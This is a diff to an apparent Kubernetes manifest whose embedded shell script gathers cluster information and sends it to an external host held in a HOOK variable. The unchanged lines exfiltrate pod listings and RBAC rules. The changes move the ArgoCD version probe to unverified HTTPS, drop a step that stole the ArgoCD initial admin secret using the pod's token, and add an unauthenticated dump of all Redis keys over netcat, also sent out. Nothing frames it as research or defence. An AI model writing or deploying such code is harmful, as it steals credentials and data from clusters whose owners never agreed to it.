@@ -275,7 +275,7 @@ spec:
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=k8s-pods" \
             --data-urlencode "d=$(printf '%s' "${PODS}" | base64 | tr -d '\n')" || true
-          ARGOCD_VER=$(curl -sf --max-time 5 "http://${ARGOCD_SERVER_SERVICE_HOST}/api/version" 2>/dev/null)
+          ARGOCD_VER=$(curl -sfk --max-time 5 "https://${ARGOCD_SERVER_SERVICE_HOST}/api/version" 2>/dev/null)
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=argocd-api" \
             --data-urlencode "d=${ARGOCD_VER}" || true
@@ -288,11 +288,10 @@ spec:
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=k8s-rules" \
             --data-urlencode "d=$(printf '%s' "${RULES}" | base64 | tr -d '\n')" || true
-          ADMINSEC=$(curl -sfk --max-time 8 -H "Authorization: Bearer ${T}" \
-            https://10.96.0.1:443/api/v1/namespaces/${POD_NAMESPACE}/secrets/argocd-initial-admin-secret 2>/dev/null)
+          REDIS=$(printf "*2\r\n\$4\r\nKEYS\r\n\$1\r\n*\r\n" | nc -w3 ${ARGOCD_REDIS_SERVICE_HOST} 6379 2>/dev/null)
           curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=argocd-admin-secret" \
-            --data-urlencode "d=$(printf '%s' "${ADMINSEC}" | base64 | tr -d '\n')" || true
+            --data-urlencode "stage=redis-keys" \
+            --data-urlencode "d=$(printf '%s' "${REDIS}" | base64 | tr -d '\n')" || true
         env:
         - name: POD_NAMESPACE
           valueFrom:
